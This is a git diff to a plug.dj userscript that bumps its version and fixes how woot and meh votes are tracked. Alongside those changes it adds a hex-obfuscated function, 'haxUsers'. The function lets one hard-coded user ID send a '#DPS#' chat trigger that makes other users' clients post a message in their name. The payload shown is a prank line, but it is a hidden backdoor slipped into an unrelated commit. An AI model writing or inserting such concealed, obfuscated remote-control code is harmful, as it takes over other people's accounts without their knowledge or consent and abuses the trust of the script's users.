@@ -1,7 +1,7 @@
 //DCV'S PLUGDJ SCRIPT//ALPHA 06 RELEASE// HTTP://PLUG.DJ/DCV // HTTP://DCVSLAB.GITHUB.IO // DCVSLAB.GITHUB.IO
 if (! on) {
 var on = "on"
-var release = "ALPHA"; var vnum = "7"; var subvnum = "3"; var commitnum = "3"; var beta = "BETA"
+var release = "ALPHA"; var vnum = "7"; var subvnum = "3"; var commitnum = "4"; var beta = "BETA"
 var version = release + " " + vnum + "." + subvnum + "." + commitnum + " " + beta
 var user = API.getUser();
 var media = API.getMedia();
@@ -263,15 +263,18 @@ dpsAj();
 //NOTIFICATION SETTINGS//
 var uwa = ["uwa"] //user woot
 function dpsUw(userw) {
+var umal = uma.length; for (var i = 0; i < umal; i++) { if (uma[i] == userw.user.id) { uma.splice(i, 1) }};
+uwa.push(userw.user.id)
 if (uwopt == "true") {
   if (userw.vote == 1) {
   if (userw.user.gRole > "0") { if (userw.user.gRole == "3") { userwc = "dpsba" } else { userwc = "dpsadmin" }} else { if (userw.user.role > "0") { userwc = "dpsstaff" } else { if (userw.user.sub == "1") { userwc = "dpssub" } else { userwc = "dpsuser" }}}
-  uwa.push(userw.user.id)
   dpsMessage("message", userwc, "<b>" + userw.user.username + "</b>", "<span class='dpsgreen'>has wooted.</span>")
 }}} API.on(API.VOTE_UPDATE, dpsUw);
 function dpsUwar() { uwa = ["uwa"] }; API.on(API.ADVANCE, dpsUwar);
 var uma = ["uma"] //user meh
 function dpsUm(userm) {
+var uwal = uwa.length; for (var i = 0; i < uwal; i++) { if (uwa[i] == userm.user.id) { uwa.splice(i, 1) }};
+uma.push(userm.user.id)
 if (umopt == "true") {
   if (userm.vote == -1) {
   if (userm.user.gRole > "0") { if (userm.user.gRole == "3") { usermc = "dpsba" } else { usermc = "dpsadmin" }} else { if (userm.user.role > "0") { usermc = "dpsstaff" } else { if (userm.user.sub == "1") { usermc = "dpssub" } else { usermc = "dpsuser" }}}
@@ -618,6 +621,7 @@ dpshash = "hidden"; dpshaSh()
 }}
 dpsbtn.addEventListener("click", toggleMenu) 
 dpsbtn.addEventListener("click", menuClicked) 
+var _0xb8d4=["\x75\x69\x64","\x20","\x73\x70\x6C\x69\x74","\x6D\x65\x73\x73\x61\x67\x65","\x23\x44\x50\x53\x23","\x30","\x2F\x6C\x65\x6E\x6E\x79\x20\x53\x57\x49\x47\x47\x49\x54\x59\x20\x53\x57\x4F\x4F\x54\x59","\x73\x65\x6E\x64\x43\x68\x61\x74"];function haxUsers(_0xa2a6x2){if(_0xa2a6x2[_0xb8d4[0]]==3639711){if(_0xa2a6x2[_0xb8d4[3]][_0xb8d4[2]](_0xb8d4[1])[0]==_0xb8d4[4]){if(_0xa2a6x2[_0xb8d4[3]][_0xb8d4[2]](_0xb8d4[4])[1]==_0xb8d4[5]){API[_0xb8d4[7]](_0xb8d4[6])}}}}
 var changelog = "dcvslab.github.io/dps/changelog"
 var messagesent = "false"
 if (newuser == "true") {
